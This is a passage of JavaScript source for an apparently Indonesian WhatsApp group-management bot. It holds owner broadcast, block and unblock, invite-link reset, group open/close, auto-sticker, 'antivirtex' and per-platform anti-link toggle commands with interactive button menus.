0%20size%3A%2020%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20%27%5Cn${latensi.toFixed(4)}s%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%27%23000%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20font%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20size%3A%2025%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20weight%3A%20%27bold%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%5D%2C%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%7D%2C%0A%20%20%7D%2C%0A%7D`
                await TradzSigma.sendMessage(m.chat, {
                    footer: global.namabot,
                    buttons: [{
                            buttonId: `.menu`,
                            buttonText: {
                                displayText: 'tampilkam menu'
                            },
                            type: 1
                        },

                    ],
                    headerType: 1,
                    viewOnce: true,
                    document: fs.readFileSync("./package.json"),
                    fileName: ucapanWaktu,
                    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                    fileLength: 99999,
                    caption: respon,
                    contextInfo: {
                        isForwarded: true,
                        mentionedJid: [m.sender],
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '120363401647250932@newsletter',
                            newsletterName: `halo ${m.pushname}`
                        },
                        externalAdReply: {
                            title: `V${global.version}`,
                            body: `hitungan mundur: ${omaditt}`,
                            thumbnailUrl: imgso,
                            sourceUrl: 'https://whatsapp.com/channel/0029Vb5tjub8F2p55FXaN80p',
                            mediaType: 1,
                            renderLargerThumbnail: true,
                        },
                    },
                })
            }
            break
            case 'bctext': case 'broadcasttext': case 'broadcast': {
			    if (!TradID) return replyviex(mess.only.owner)
		            if (!q) return replyviex(`Masukkan teks`)
		        const data = await store.chats.all()
        for (let i of data) {
           TradzSigma.sendMessage(i.id, {text: `${ownername}'s Siaran\n\nPesan : ${q}` })
           await sleep(1000)
        }
        }
        break
        case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if(!TradID) return replyviex(mess.only.owner)
        if (!q) return replyviex(`Masukkan teks`)
        let getGroups = await TradzSigma.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        replyviex(` Menyiarkan dalam ${xeoncast.length} Obrolan Grup, dalam ${xeoncast.length * 1,5} detik`)
        for (let i of xeoncast) {
let txt = `${ownername}'s Siaran\n\nPesan : ${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await TradzSigma.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await TradzSigma.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        replyviex(`Berhasil Disiarkan di Grup ${xeoncast.length}`)      
        break
case 'block': case 'ban': {
		if (!TradID) return replyviex(mess.only.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await TradzSigma.updateBlockStatus(users, 'block')
		await replyviex(`sukses kak`)
	}
	break
        case 'unblock': case 'unban': {
		if (!TradID) return replyviex(mess.only.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await TradzSigma.updateBlockStatus(users, 'unblock')
		await replyviex(`sukses kak`)
	}
	break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
	const lisben = "Total Block: " + banUser.length
	replyviex(lisben)
	}
	break

case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!m.isGroup) return replyviex(mess.only.group)
if (!isBotAdmins) return replyviex('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !TradID) return replyviex('Khusus Admin!!')
TradzSigma.groupRevokeInvite(m.chat)
}
break
            case 'react': {
if (!TradID) return replyviex(mess.only.owner)
reactionMessage = {
react: {
    text: args[0],
    key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
}
}
TradzSigma.sendMessage(m.chat, reactionMessage)
            }
            break
case 'group': case 'gc open': {
if (!m.isGroup) return replyviex(mess.only.group)
if (!isAdmins && !TradID) return replyviex('Khusus Admin!!')
if (!isBotAdmins) return replyviex('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!q) return replyviex(`Send orders ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
if (args[0] == 'close') {
  replyviex(`┌─┉─ • ─┉─  ── .✦
│
│𝘆𝝰𝗵 𝗶𝘁'𝘀 𝘁𝗶𝗺𝗲 𝘁𝝾 𝗰𝗹𝝾𝘀𝗲𝗱
│𝗻𝝰𝗻𝘁𝗶 𝗱𝗶𝗯𝘂𝗸𝝰 𝗹𝝰𝗴𝗶 𝘆𝝰𝝰...
│
└─┉─¡! • !¡─┉─ ── .✦`)
TradzSigma.groupSettingUpdate(from, 'announcement')
} else if (args[0] == 'open') {
  replyviex(`♥︎ ۪۪┈─𝗵𝝰𝗹𝝾 𝗶𝘁'𝘀 𝘁𝗶𝗺𝗲 𝘁𝝾 𝝾𝗽𝗲𝗻──────╮

╭── ࣪ 𖥻 ๋ 📜 *𝐐𝘂𝝾𝘁𝗲𝘀*
┊   ―"𝘀𝗲𝗯𝝰𝗯 𝗵𝗶𝗱𝘂𝗽 𝘁𝗲𝗿𝗹𝝰𝗹𝘂 
┊𝘀𝗶𝗻𝗴𝗸𝝰𝘁 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗺𝗯𝗶𝝰𝗿𝗸𝝰𝗻
┊𝝾𝗿𝝰𝗻𝗴 𝗹𝝰𝗶𝗻 𝗺𝗲𝗻𝗲𝗻𝘁𝘂𝗸𝝰𝗻 𝝰𝗽𝝰
┊𝘆𝝰𝗻𝗴 𝗺𝗲𝗺𝗯𝘂𝝰𝘁 𝗸𝗶𝘁𝝰 𝗯𝝰𝗵𝝰𝗴𝗶𝝰"
╰─────────────────

𝗷𝝰𝗻𝗴𝝰𝗻 𝗹𝘂𝗽𝝰 𝗯𝗲𝗿𝘀𝘆𝘂𝗸𝘂𝗿 𝘆𝝰 𝗯𝘂𝝰𝘁 𝗵𝝰𝗿𝗶 𝗶𝗻𝗶...`)
TradzSigma.groupSettingUpdate(from, 'not_announcement')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: namabot
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './library/data/image/thumb.jpg' } }, { upload: TradzSigma.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH BUKA/TUTUP ♨️",
                "sections":[{
                  "title":"PILIH BUKA/TUTUP ",
                  "rows":[{
                    "header":"BUKA ✅",
                    "title":"MEMILIH ",
                    "description":"BUKA✅",
                    "id":"${prefix + command} open"
                  },
                  {
                    "header":"TUTUP ❌",
                    "title":"MEMILIH ",
                    "description":"TUTUP ❌",
                    "id":"${prefix + command} close"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363401647250932@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });
await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
}}
break
case 'autostickergc':
            case 'autosticker':
if (!isAdmins && !TradID) return replyviex('Khusus Admin!!')
if (args.length < 1) return replyviex('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return replyviex(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replyviex('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replyviex('auto sticker deactivated')
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return replyviex(mess.only.group)
if (!isBotAdmins) return replyviex('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !TradID) return replyviex('Khusus Admin!!')
if (args[0] === "on") {
if (antiVirtex) return replyviex('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replyviex('Success in turning on antivirus in this group')
var groupe = await TradzSigma.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TradzSigma.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return replyviex('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replyviex('Success in turning off antivirus this group')
} else {
  
  }
  }
  break
  case 'antilinkytvid': {
if (!m.isGroup) return replyviex(mess.only.group)
if (!isBotAdmins) return replyviex('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !TradID) return replyviex('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return replyviex('Already activated')
ntlinkytvid.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntwame))
replyviex('Success in turning on antiwame in this group')
var groupe = await TradzSigma.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TradzSigma.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return replyviex('Already deactivated')
let off = ntlinkytvid.indexOf(from)
ntlinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntlinkytvid))
replyviex('Success in turning off antiwame in this group')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: namabot
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './library/data/image/thumb.jpg' } }, { upload: TradzSigma.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363401647250932@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return replyviex('Already activated')
ntilinkytch.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
replyviex('Success in turning on youtube channel antilink in this group')
var groupe = await TradzSigma.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TradzSigma.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return replyviex('Already deactivated')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
replyviex('Success in turning off youtube channel antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: namabot
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './library/data/image/thumb.jpg' } }, { upload: TradzSigma.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363401647250932@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkInstagram) return replyviex('Already activated')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replyviex('Success in turning on instagram antilink in this group')
var groupe = await TradzSigma.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TradzSigma.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return replyviex('Already deactivated')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replyviex('Success in turning off instagram antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: namabot
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './library/data/image/thumb.jpg' } }, { upload: TradzSigma.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363401647250932@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
        case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkFacebook) return replyviex('Already activated')
ntilinkfb.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replyviex('Success in turning on facebook antilink in this group')
var groupe = await TradzSigma.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TradzSigma.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return replyviex('Already deactivated')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replyviex('Success in turning off facebook antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: namabot
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './library/data/image/thumb.jpg' } }, { upload: TradzSigma.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363401647250932@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
          case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkTelegram) return replyviex('Already activated')
ntilinktg.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replyviex('Success in turning on telegram antilink in this group')
var groupe = await TradzSigma.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TradzSigma.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return replyviex('Already deactivated')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replyviex('Success in turning off telegram antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: namabot
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './library/data/image/thumb.jpg' } }, { upload: TradzSigma.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363401647250932@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkTiktok) return replyviex('Already activated')
ntilinktt.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replyviex('Success in turning on tiktok antilink in this group')
var groupe = await TradzSigma.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TradzSigma.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return replyviex('Already deactivated')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replyviex('Success in turning off tiktok antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: namabot
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './library/data/image/thumb.jpg' } }, { upload: TradzSigma.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363401647250932@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkTwitter) return replyviex('Already activated')
ntilinktwt.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replyviex('Success in turning on twitter antilink in this group')
var groupe = await TradzSigma.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TradzSigma.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return replyviex('Already deactivated')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replyviex('Success in turning off twitter antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: namabot
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './library/data/image/thumb.jpg' } }, { upload: TradzSigma.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363401647250932@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
